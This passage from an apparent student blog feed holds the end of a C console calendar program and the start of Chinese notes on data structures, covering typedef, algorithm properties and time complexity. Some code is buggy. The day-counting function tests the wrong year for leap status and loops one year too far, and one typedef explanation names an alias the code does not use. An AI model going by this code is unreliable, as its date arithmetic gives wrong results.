class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t%s&quot;</span>, weekday[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 平闰年判断，返回值为1则为闰年，返回值为0则为平年</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">leap</span><span class="params">(<span class="type">int</span> year)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> four, hundred, fourhundred;</span><br><span class="line">four = year % <span class="number">4</span>;</span><br><span class="line">hundred = year % <span class="number">100</span>;</span><br><span class="line">fourhundred = year % <span class="number">400</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (four == <span class="number">0</span> &amp;&amp; hundred == <span class="number">0</span> &amp;&amp; fourhundred == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (four == <span class="number">0</span> &amp;&amp; hundred != <span class="number">0</span> &amp;&amp; fourhundred != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算输入的 year 与 1900年有多少天</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">day_sum</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day, <span class="type">int</span> LeapYear[], <span class="type">int</span> CommonYear[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 1900 1 1 ：星期一</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1900</span>; i &lt;= year + <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> flag = leap(year);<span class="comment">// 判断平闰年</span></span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">366</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 加上月份的天数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; month - <span class="number">1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (leap(year) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum += LeapYear[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sum += CommonYear[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印日历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> sum, <span class="type">int</span> year, <span class="type">int</span> month)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> result, temp, i;</span><br><span class="line">result = sum % <span class="number">7</span>;<span class="comment">// 计算前面空余的天数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; result; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">temp = <span class="number">7</span> - result;<span class="comment">// 从第几格开始打印1号</span></span><br><span class="line"><span class="keyword">if</span> (leap(year) == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= LeapYear[month - <span class="number">1</span>]; i++)<span class="comment">// 打印31天</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t%d&quot;</span>, i);</span><br><span class="line"><span class="keyword">if</span> (i == temp || (i - temp) % <span class="number">7</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= CommonYear[month - <span class="number">1</span>]; i++)<span class="comment">// 打印30天</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t%d&quot;</span>, i);</span><br><span class="line"><span class="keyword">if</span> (i == temp || (i - temp) % <span class="number">7</span> == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断星期几</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">caculateWeekDay</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> iWeek;<span class="comment">// 基姆拉尔森计算公式W= (d+2*m+3*(m+1)/5+y+y/4-y/100+y/400)%7</span></span><br><span class="line"><span class="keyword">if</span> (month == <span class="number">1</span> || month == <span class="number">2</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 1月和2月看作上一年13月和14月</span></span><br><span class="line">month += <span class="number">12</span>;</span><br><span class="line">year--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> iWeek = (day + <span class="number">2</span> * month + <span class="number">3</span> * (month + <span class="number">1</span>) / <span class="number">5</span> + year + year / <span class="number">4</span> - year / <span class="number">100</span> + year / <span class="number">400</span>) % <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 日期转换</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">week_day</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> year1, month1, day1, iWeek;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入需要转换的年月日：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;year1, &amp;month1, &amp;day1);</span><br><span class="line">iWeek = caculateWeekDay(year1, month1, day1);</span><br><span class="line"><span class="keyword">switch</span> (iWeek)<span class="comment">//iWeek获得返回值</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期一\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期二\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期三\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期四\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期五\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期六\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>: <span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是星期日\n&quot;</span>, year1, month1, day1); <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// N天后日期</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ndays</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> year1 = year, month1 = month, day1 = day, n, k;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入天数：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">day1 += n;</span><br><span class="line">k = month;</span><br><span class="line"><span class="keyword">for</span> (; day1 &gt; d[leap(year1)][k]; k++)</span><br><span class="line">&#123;</span><br><span class="line">day1 -= d[leap(year1)][k];</span><br><span class="line"><span class="keyword">if</span> (k == <span class="number">12</span>)</span><br><span class="line">k = <span class="number">0</span>, year1++;</span><br><span class="line">&#125;</span><br><span class="line">month1 = k;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;N天后为：%04d年%02d月%02d日\n&quot;</span>, year1, month1, day1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当前日期</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">time_now</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;现在是%4d年%2d月%2d日！\n&quot;</span>, year, month, day);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求节假日</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">festival</span><span class="params">(<span class="type">int</span> year1, <span class="type">int</span> month1, <span class="type">int</span> day1, <span class="type">int</span> iWeek)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &lt;= <span class="number">3</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &gt;= <span class="number">3</span> &amp;&amp; day1 &lt;= <span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &lt;= <span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &gt;= <span class="number">3</span> &amp;&amp; day1 &lt;= <span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &gt;= <span class="number">10</span> &amp;&amp; day1 &lt;= <span class="number">12</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (month1 == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (day1 &lt;= <span class="number">7</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (iWeek &gt;= <span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fest</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> year1, month1, day1, iWeek;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要查询的日期：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;year1, &amp;month1, &amp;day1);</span><br><span class="line">iWeek = caculateWeekDay(year1, month1, day1);</span><br><span class="line"><span class="keyword">if</span> (festival(year1, month1, day1, iWeek))</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日是节假日！\n&quot;</span>, year1, month1, day1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%4d年%2d月%2d日不是节假日！\n&quot;</span>, year1, month1, day1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断平闰的交互界面</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">leapORcommon</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="type">int</span> year1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要判断的年份：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;year1);</span><br><span class="line"><span class="keyword">if</span> (leap(year1) == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d为闰年！\n&quot;</span>, year1);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d为平年！\n&quot;</span>, year1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 退出万年历系统</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ExitSys</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;程序已退出\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// 结束程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入当前日期（年 月 日）：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;year, &amp;month, &amp;day);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line">MainMenu();</span><br><span class="line"><span class="type">int</span> sum = day_sum(year, month, day, LeapYear, CommonYear);</span><br><span class="line">print(sum, year, month);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请选择想要实现的功能（数字）：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">// 日期转换</span></span><br><span class="line">week_day();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">// N天后日期</span></span><br><span class="line">ndays();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">// 当前日期</span></span><br><span class="line">time_now();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="comment">// 求节假日</span></span><br><span class="line">fest();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="comment">// 判断平闰</span></span><br><span class="line">leapORcommon();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:<span class="comment">// 退出系统</span></span><br><span class="line">ExitSys();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;是否需要继续操作？（Yes：1 / No：0)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ExitSys();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大一下 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构学习笔记</title>
      <link href="/2024/02/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/02/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="第1章-绪论"><a href="#第1章-绪论" class="headerlink" title="第1章  绪论"></a>第1章  绪论</h2><h3 id="什么是数据结构"><a href="#什么是数据结构" class="headerlink" title="什么是数据结构"></a>什么是数据结构</h3><p>略</p><h3 id="基本概念和术语"><a href="#基本概念和术语" class="headerlink" title="基本概念和术语"></a>基本概念和术语</h3><h4 id="数据结构的基本概念"><a href="#数据结构的基本概念" class="headerlink" title="数据结构的基本概念"></a>数据结构的基本概念</h4><ul><li><p><strong>数据</strong>(data)—能输入到计算机中并被计算机处理的符号的总称； </p></li><li><p><strong>数据元素</strong>(data element)—数据的基本单位，也称节点(node)或记录(record)； </p></li><li><p><strong>数据项</strong>(data item)—有独立含义的数据最小单位，也称域(field)； </p></li><li><p><strong>数据对象</strong>(Data Object)—性质相同的数据元素的集合； </p></li><li><p><strong>数据结构</strong>(data structure)—相互之间存在一种或多种特定关 系的数据元素的集合。(带有结构的数据元素的集合)</p></li></ul><h4 id="四类基本结构"><a href="#四类基本结构" class="headerlink" title="四类基本结构"></a>四类基本结构</h4><ul><li><strong>集合</strong>：数据元素间除“同属于一个集合”外，无其它关系</li><li><strong>线性结构</strong>：一对一，如：线性表、栈、队列、串等 </li><li><strong>树形结构</strong>：一对多，如：树、二叉树、森林等</li><li><strong>图状结构（网状结构）</strong>：多对多，如：图</li></ul><h4 id="两种储存结构"><a href="#两种储存结构" class="headerlink" title="两种储存结构"></a>两种储存结构</h4><ul><li><p><strong>顺序存储结构</strong>：借助元素在存储器中的相对位置来表示数据元素间的逻辑关系</p><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240226200332191.png" alt="image-20240226200332191"></p></li><li><p><strong>链式存储结构</strong>：借助指示元素存储地址的指针表示数据元素间的逻辑关系</p><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240226200357522.png" alt="image-20240226200357522"></p></li></ul><h4 id="数据结构的三个方面"><a href="#数据结构的三个方面" class="headerlink" title="数据结构的三个方面"></a>数据结构的三个方面</h4><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240226200638338.png" alt="image-20240226200638338"></p><h3 id="抽象数据类型的表示与实现"><a href="#抽象数据类型的表示与实现" class="headerlink" title="抽象数据类型的表示与实现"></a>抽象数据类型的表示与实现</h3><h4 id="抽象数据类型"><a href="#抽象数据类型" class="headerlink" title="抽象数据类型"></a>抽象数据类型</h4><ul><li><strong>抽象数据类型</strong>(ADT) — 是指一种数据结构以及定义在该数据结构上的一组<strong>操作</strong>。</li></ul><p>  数据结构的形式化定义为一个三元组：   </p><p>  ADT &#x3D; (D,S,P)  </p><p>  ​其中：D是数据元素的有限集  　　　</p><p>  ​S是D上关系的有限集  </p><p>  ​P是定义在D和S上的操作集</p><h4 id="表示与实现"><a href="#表示与实现" class="headerlink" title="表示与实现"></a>表示与实现</h4><p>抽象数据类型可以用固有的数据类型来表示和实现。 在高级程序设计语言的虚拟层次上讨论抽象数据类型的表示和实现。</p><p>以C语言为例：<code>typedef</code>关键字用于创建自定义的类型别名。它允许您为已存在的数据类型定义一个新的名称，使得代码更易读和可维护。</p><p><code>typedef</code>关键字的基本语法如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> 原类型名 新类型名;</span><br></pre></td></tr></table></figure><p><strong>示例 1：为数据类型创建别名</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> uint;  <span class="comment">// 将unsigned int类型定义为uint</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    uint x = <span class="number">10</span>;  <span class="comment">// 使用新定义的类型别名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中，<code>typedef</code>创建了一个新的类型别名<code>uint</code>，它被定义为<code>unsigned int</code>。在<code>main</code>函数中，我们可以使用<code>uint</code>作为变量的类型。</p><p><strong>示例 2：为结构体创建别名</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125; Point;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Point p;  <span class="comment">// 使用新定义的结构体别名</span></span><br><span class="line">    p.x = <span class="number">10</span>;</span><br><span class="line">    p.y = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，<code>typedef</code>用于为一个匿名的结构体创建了一个别名<code>Point</code>。这样，我们可以使用<code>Point</code>作为结构体变量的类型。</p><p><strong>示例 3：为指针类型创建别名</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span>* IntPtr;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    IntPtr p = &amp;x;  <span class="comment">// 使用新定义的指针类型别名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用<code>typedef</code>为<code>int*</code>创建了新的类型别名<code>整数指针</code>。然后，我们可以使用<code>整数指针</code>作为类型名定义指针变量<code>p</code>，并通过它访问所指向的整数变量<code>x</code>。</p><h3 id="算法和算法分析"><a href="#算法和算法分析" class="headerlink" title="算法和算法分析"></a>算法和算法分析</h3><h4 id="算法的特性"><a href="#算法的特性" class="headerlink" title="算法的特性"></a>算法的特性</h4><ul><li><strong>有穷性</strong>——一个算法必须在执行有限步骤之后结束</li><li><strong>确定性</strong>——算法的每一步必须是确切定义的，不能产生二义性，并且算法只有唯一的一条执行路径</li><li><strong>可行性</strong>——算法是能行的，通过已经实现的基本运算执行有限次来是实现</li><li><strong>输入</strong>——一个算法有零个或多个输入</li><li><strong>输出</strong>——一个算法至少有一个输出</li></ul><h4 id="算法的评价"><a href="#算法的评价" class="headerlink" title="算法的评价"></a>算法的评价</h4><ul><li><p><strong>正确性</strong></p><p>算法应该满足特定的“规格说明”方式给出的需求</p></li><li><p><strong>可读性</strong></p><p>算法主要是为了人的阅读和交流，其次才是为计算机执行</p></li><li><p><strong>健壮性</strong></p><p>当输入的数据非法时，算法应当做出反映或进行相应的处理</p></li><li><p><strong>复杂度</strong></p><p>时间开销——时间复杂度</p><p>空间开销——空间复杂度</p><p>都与问题的规模有关</p></li></ul><h4 id="时间复杂度的概念"><a href="#时间复杂度的概念" class="headerlink" title="时间复杂度的概念"></a>时间复杂度的概念</h4><p>时间复杂度是一种<strong>衡量算法执行时间随输入规模增长而变化的度量</strong>。它描述了算法执行所需的时间与输入规模之间的关系。更具体地说，时间复杂度<strong>表示算法的运行时间与问题规模之间的增长率</strong>。</p><p>通常，时间复杂度用大O符号（O）来表示。大O符号在描述算法的时间复杂度时，忽略了常数因子和低阶项，只关注算法的增长趋势。</p><p>常见的时间复杂度包括：</p><ul><li><strong>O(1)：常数时间复杂度</strong>。算法的执行时间不随输入规模的增长而变化，即算法的执行时间是固定的，<strong>即操作的次数与n无关，而不是只执行一次。</strong></li><li><strong>O(log n)：对数时间复杂度</strong>。算法的执行时间随输入规模的增长呈对数增长。常见的对数复杂度算法有二分查找。</li><li><strong>O(n)：线性时间复杂度</strong>。算法的执行时间与输入规模成线性关系。常见的线性复杂度算法有线性搜索和简单的循环。</li><li><strong>O(n log n)：线性对数时间复杂度</strong>。算法的执行时间随输入规模的增长呈线性对数增长。常见的线性对数复杂度算法有快速排序和归并排序。</li><li><strong>O(n^2)：平方时间复杂度</strong>。算法的执行时间与输入规模的平方成正比。常见的平方复杂度算法有嵌套循环的算法，如冒泡排序和选择排序。</li><li><strong>O(2^n)：指数时间复杂度</strong>。算法的执行时间随输入规模的增长呈指数增长。常见的指数复杂度算法有穷举搜索和递归的指数增长算法。</li></ul><h4 id="时间复杂度的计算"><a href="#时间复杂度的计算" class="headerlink" title="时间复杂度的计算"></a>时间复杂度的计算</h4><p><strong>频度：一个语句的频度时该语句在算法中被执行的次数。</strong></p><p>计算时间复杂度涉及分析算法中每个操作的执行次数，并确定它们与输入规模之间的关系。以下是一些常见的计算时间复杂度的方法：</p><ul><li><p>通过<strong>迭代</strong>：对于循环结构，可以通过考虑循环执行的次数来计算时间复杂度。例如，<strong>如果一个循环执行了n次，且循环体内部的操作具有常数时间复杂度，则该循环的时间复杂度为O(n)。</strong></p></li><li><p>通过<strong>递归</strong>：对于递归算法，可以使用递归的深度和每次递归调用的时间复杂度来计算总体的时间复杂度。例如，<strong>如果递归算法的递归深度为n，且每次递归调用的时间复杂度为O(1)，则总体的时间复杂度为O(n)。</strong></p></li><li><p>通过<strong>分析嵌套循环</strong>：对于嵌套循环，需要分析每个循环的执行次数以及它们之间的关系。例如，如果<strong>有一个外部循环执行了n次，内部循环执行了m次，且内部循环的执行与n无关，则总体的时间复杂度为O(n * m)。</strong></p></li><li><p>通过<strong>考虑最坏情况</strong>：在计算时间复杂度时，通常考虑最坏情况下的执行次数。这是因为最坏情况下的时间复杂度给出了算法在任何输入下的上界。例如，<strong>如果一个算法在最坏情况下执行了n次操作，则时间复杂度为O(n)。</strong></p></li><li><p>通过合并操作：如果算法中有多个操作，可以根据大O符号的规则将它们合并为一个复杂度。例如，<strong>如果一个算法有一个O(n)的循环和一个O(log n)的循环，可以将它们合并为O(n + log n)，但通常简化为O(n)。</strong></p></li></ul><p>在实际计算时间复杂度时，了解常见算法的时间复杂度规律和运行时间的增长趋势非常有帮助。还可以使用数学归纳法、递推关系和递归方程等方法来推导和计算时间复杂度。</p><h4 id="常见函数增长率"><a href="#常见函数增长率" class="headerlink" title="常见函数增长率"></a>常见函数增长率</h4><p><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240226202820512.png" alt="image-20240226202820512"></p><h2 id="第二章-线性表"><a href="#第二章-线性表" class="headerlink" title="第二章 线性表"></a>第二章 线性表</h2><h3 id="线性表的定义"><a href="#线性表的定义" class="headerlink" title="线性表的定义"></a>线性表的定义</h3><p><strong>定义：</strong>n个数据元素的有限序列。</p><p>若将线性表记为{a1,a2,…,ai-1,ai,ai+1, …,an},则：</p><ul><li><p>元素个数 n——表长度，n&#x3D;0 时称为空表。</p></li><li><p>1&lt;i&lt;n时</p></li><li><p>ai 的直接前驱是ai-1，a1无直接前驱</p></li><li><p>ai 的直接后继是ai+1，an 无直接后继 </p></li><li><p>i 为数据元素ai 在线性表中的位序</p></li><li><p>元素同构，且不能出现缺项</p></li></ul><p><strong>抽象数据类型定义：</strong></p><p><img 